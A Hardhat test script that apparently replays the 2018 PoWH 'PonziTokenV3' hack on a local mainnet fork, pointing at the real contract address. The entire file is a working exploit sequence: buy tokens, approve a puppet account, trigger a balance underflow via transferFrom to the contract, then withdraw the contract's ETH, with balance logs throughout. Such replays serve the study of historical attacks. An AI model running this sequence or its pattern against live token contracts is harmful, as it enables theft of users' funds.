const { expect } = require('chai');
const { ethers } = require("hardhat");
const { forkFrom } = require("./utils/fork");

// Technical description:
// https://medium.com/@ebanisadr/how-800k-evaporated-from-the-powh-coin-ponzi-scheme-overnight-1b025c33b530

describe("PonziTokenV3 Hack", function() {
    let attacker, puppet;

    before(async function () {
        // https://etherscan.io/address/0xb9cd700b8a16069bf77ededc71c3284780422774
        // the block previous to the one the attacker first interacted with the target contract
        await forkFrom(5009795);

        [attacker, puppet] = await ethers.getSigners();
    
        const PONZI_ADDR = "0xa7ca36f7273d4d38fc2aec5a454c497f86728a7a";
    
        let ponziFactory = await ethers.getContractFactory("PonziTokenV3");
    
        this.ponzi = await ponziFactory.attach(PONZI_ADDR);
    
    });

    it("Exploit" , async function() {

        // msg.sender = attacker
        this.ponzi = this.ponzi.connect(attacker); 

        // Initial ETH balance of contract
        let ponzi_eth_balance = await ethers.provider.getBalance(this.ponzi.address);
        console.log("[TARGET] Initial ETH balance " + ponzi_eth_balance / 1e18);

        // show attacker PONZI, ETH initial balance
        let attacker_balance = await this.ponzi.balanceOf(attacker.address);
        console.log("[ATTACKER] Initial PONZI balance: " + attacker_balance);
        let attacker_eth_balance = await ethers.provider.getBalance(attacker.address);
        console.log("[ATTACKER] Initial ETH balance: " + attacker_eth_balance / 1e18);

        // show puppet PONZI, ETH initial balance
        let puppet_balance = await this.ponzi.balanceOf(puppet.address);
        console.log("[PUPPET] Initial PONZI balance: " + puppet_balance / 1e18);
        let puppet_eth_balance = await ethers.provider.getBalance(puppet.address);
        console.log("[PUPPET] Initial ETH balance: " + puppet_eth_balance / 1e18);

        // buy tokens worth of 1 eth
        await this.ponzi.fund({value: ethers.utils.parseEther("1")});

        // update the attacker PONZI, ETH balance
        attacker_balance = await this.ponzi.balanceOf(attacker.address);
        attacker_eth_balance = await ethers.provider.getBalance(attacker.address);
        console.log("[ATTACKER] PONZI balance after buying 1eth worth: " + attacker_balance / 1e18);
        console.log("[ATTACKER] ETH balance after buying 1eth worth: " + attacker_eth_balance / 1e18);

        // approve the transferFrom 
        await this.ponzi.approve(puppet.address, 10);

        // connect as the puppet
        this.ponzi = this.ponzi.connect(puppet);

        // transferFrom(address _from, address _to, uint256 _value)
        await this.ponzi.transferFrom(attacker.address, this.ponzi.address, 10);

        // update the PONZI balance of the puppet
        puppet_balance = await this.ponzi.balanceOf(puppet.address);
        console.log("[PUPPET] Updated PONZI balance: " + puppet_balance);

        // withdraw the ETH for 100 PONZI tokens
        await this.ponzi.transfer(this.ponzi.address, ethers.utils.parseEther("100"));
        await this.ponzi.withdraw(1);

        // updated ETH, PONZI balance of puppet
        puppet_balance = await this.ponzi.balanceOf(puppet.address);
        console.log("[PUPPET] Updated PONZI balance: " + puppet_balance / 1e18);
        puppet_eth_balance = await ethers.provider.getBalance(puppet.address);
        console.log("[PUPPET] Updated ETH balance: " + puppet_eth_balance / 1e18);

        // updated ETH balance of contract
        ponzi_eth_balance = await ethers.provider.getBalance(this.ponzi.address);
        console.log("[TARGET] Updated ETH balance: " + ponzi_eth_balance / 1e18);
    });
});